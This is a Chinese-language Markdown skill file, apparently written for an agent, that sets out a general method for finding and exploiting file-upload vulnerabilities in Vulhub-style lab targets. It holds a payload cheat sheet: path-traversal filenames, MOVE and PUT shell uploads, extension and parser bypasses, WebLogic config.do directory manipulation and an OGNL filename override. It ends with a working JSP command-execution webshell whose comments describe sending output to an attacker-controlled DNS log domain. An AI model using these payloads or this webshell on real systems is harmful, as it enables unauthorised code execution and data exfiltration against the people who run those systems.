---
name: vulhub-file-upload
description: file-upload 类型漏洞的通用抽象探测与利用方案
version: 1.0
---

# FILE-UPLOAD 抽象化通用渗透与利用指南

## [1] 通用探测思路 (Detection Methodology)

文件上传漏洞的探测核心在于识别应用对用户可控文件的处理流程，并寻找流程中的校验缺陷。基于提供的实例，可抽象出以下通用探测路径：

1.  **功能点定位**：
    *   **Web服务管理/测试接口**：寻找如 `/config.do`, `/test`, `/admin` 等路径，这些接口常因调试或配置功能遗留未授权或弱校验的上传点。
    *   **应用特定功能**：关注如“图片上传”、“附件上传”、“导入数据”、“更新配置”、“备份/恢复”等功能模块。其对应的API端点（如 `/uploadImg`, `/jars/upload`, `/_snapshot`）是首要测试目标。
    *   **REST API与Web服务**：对暴露REST API的应用（如消息队列、大数据框架），检查其用于文件操作的PUT、POST请求端点，特别是涉及路径参数的接口。

2.  **参数与输入流探测**：
    *   **直接文件内容**：在`multipart/form-data`或`PUT`请求体中直接插入可执行代码（如JSP、PHP脚本）。
    *   **元数据参数**：重点测试所有与文件名、存储路径相关的参数。这包括但不限于：
        *   `filename` (在`Content-Disposition`头中)
        *   独立的`fileFileName`、`filePath`、`path`、`location`等参数。
        *   HTTP请求头中的路径信息（如`Destination`头）。
    *   **配置参数**：寻找可以控制服务器端文件存储基础目录或命名规则的参数，例如`Work Home Dir`、`configStorePath`。

3.  **协议与方法探测**：
    *   **检查PUT方法**：许多应用服务器（如Tomcat）默认或配置不当可能允许PUT方法，直接用于文件上传。
    *   **检查MOVE/COPY方法**：某些文件服务器功能可能支持这些方法，可与PUT结合，实现文件上传并移动到可执行目录。

## [2] 经典漏洞原型与 Payload 字典 (Cheat Sheet)

以下Payload已剥离具体CVE标识，按利用上下文分类。

### **A. 路径遍历型 (Path Traversal)**
利用点：在指定文件名或路径的参数中注入目录跳转序列。
```http
# 在文件名参数中注入
Content-Disposition: form-data; name="file"; filename="../../../../tmp/shell.jsp"

# 在独立的路径参数中注入
POST /some/upload HTTP/1.1
...
fileFileName=../shell.jsp

# 在HTTP头中注入（用于移动文件）
MOVE /uploaded/temp.txt HTTP/1.1
Destination: file:///opt/app/webapps/ROOT/shell.jsp
```

### **B. 扩展名/解析绕过型 (Extension/Parsing Bypass)**
利用点：利用服务器解析文件名的特性，绕过基于后缀名的黑名单/白名单校验。
```http
# 多重后缀（利用Apache解析特性）
filename="shell.php.jpg"

# 后缀后添加特殊字符或路径（利用Nginx/PHP解析特性）
filename="shell.jpg/.php"
GET /upload/shell.jpg/.php

# 后缀后添加换行符（利用特定解析器特性）
filename="shell.php\x0A"
filename="shell.php%0a"
```

### **C. 配置操纵型 (Configuration Manipulation)**
利用点：通过请求参数操纵服务器端的上传目录配置，使文件被保存到预期外的可访问位置。
```http
POST /ws_utc/config.do
...
# 参数设置工作目录到Web可访问路径
Work Home Dir: /path/to/webapp/tmp/_WL_internal/.../css

# 后续访问上传的文件（目录+时间戳+文件名）
GET /ws_utc/css/config/keystore/[timestamp]_[filename]
```

### **D. 框架表达式注入型 (Framework Expression Injection)**
利用点：在支持表达式（如OGNL）的参数中注入，覆盖服务器端文件处理逻辑中的变量。
```http
# 通过参数名注入表达式，覆盖最终保存的文件名
POST /index.action HTTP/1.1 (Content-Type: multipart/form-data)
...
Content-Disposition: form-data; name="top.fileFileName" # 参数名包含表达式
Content-Disposition: form-data; name="File"; filename="placeholder"
```
（表达式`top.fileFileName`的值可能在后续被设置为`../shell.jsp`）

### **E. 直接文件写入型 (Direct File Write)**
利用点：接口无需或仅有极弱校验，允许直接向服务器文件系统写入任意内容。
```http
# 使用PUT方法直接写入
PUT /fileserver/shell.jsp HTTP/1.1
Host: target
Content-Length: ...
<% out.println("test"); %>

# 通过特定命令或配置参数写入
# 请求中包含控制写入路径和内容的参数
configStorePath: /tmp/success
fileContent: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

## [3] 变体与特殊绕过技巧 (Bypass & Tricky Variants)

1.  **大小写与字符变异**：
    *   使用大小写混合绕过简单的字符串匹配（如`pHp`, `Jsp`）。
    *   在扩展名中使用特殊字符，如尖括号、空格、点号等，干扰校验逻辑（如`test.<>php`）。
    *   利用URL编码、双重编码绕过基于关键字的过滤。

2.  **请求结构拆分**：
    *   将“文件名”和“存储路径”这两个逻辑概念拆分到不同的表单字段或请求参数中。安全校验可能只检查了`filename`字段，却用另一个字段（如`fileFileName`）的值作为最终存储路径。

3.  **解析顺序差异**：
    *   **最后后缀决定**：某些安全校验只检查最后一个点号之后的后缀（如`.jpg`），但Web服务器（如Apache）可能根据**第一个**或**任何一个**已注册的处理器后缀来执行文件（如`.php`在`.jpg`之前）。`shell.php.jpg`即利用此点。
    *   **路径优先于后缀**：在路径中嵌入可执行后缀的目录名（如`/.php/`），使服务器将整个路径解析为PHP脚本的路径信息，而文件本身可以保留任意后缀（如`.jpg`）。

4.  **逻辑缺陷利用**：
    *   **黑名单不全**：配置的黑名单可能遗漏某些危险扩展名（如`.jspx`, `.war`, `.cer`）或危险操作（如`MOVE`方法）。
    *   **校验与存储分离**：文件先被接收并存储在临时位置，再根据用户输入的路径进行移动。攻击者可以控制移动的目标路径，从而绕过临时目录的不可执行限制。

## [4] 回显与成功判定基准 (Verification)

成功利用文件上传漏洞的最终目标是实现代码执行。判定基准如下：

1.  **直接HTTP访问验证**：
    *   尝试通过Web直接访问上传的文件路径（如 `http://target/upload/shell.jsp`）。
    *   如果返回非404/403错误，且页面内容包含预期的代码执行结果（如`phpinfo()`输出、命令回显`whoami`），则证明漏洞利用成功。

2.  **间接执行验证**：
    *   对于上传到非Web直接目录的文件（如通过配置操纵写入的路径），需要结合其他漏洞或功能使其被执行。例如，上传的JSP文件被写入WebLogic的`css`目录，该目录可能被配置为可执行JSP。
    *   验证方法：访问构造的完整URL，观察是否执行。

3.  **盲注与带外验证 (OOB)**：
    *   在无法直接看到回显的情况下（无回显RCE），上传一个能发起网络请求的WebShell。
    *   **Payload示例**（JSP）：
        ```jsp
        <%@ page import="java.io.*,java.net.*" %>
        <%
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            Process p = Runtime.getRuntime().exec(cmd);
            // 将执行结果回传至攻击者服务器
            // 或直接发起DNS/HTTP请求到攻击者可控域名
            // 例如：InetAddress.getByName("attacker." + cmd + ".dnslog.cn");
        }
        %>
        ```
    *   **成功判定**：在攻击者控制的DNS日志平台或HTTP服务器上，收到来自目标服务器的请求，证明代码已执行。

4.  **文件存在性验证**：
    *   对于仅能文件写入但无法确认是否可执行的情况，可以尝试写入一个包含唯一标识符的文本文件到已知路径（如`/tmp/proof_<random>.txt`）。
    *   通过其他信息泄露漏洞或路径遍历读取该文件，确认写入成功。这是证明“任意文件写入”漏洞存在的关键。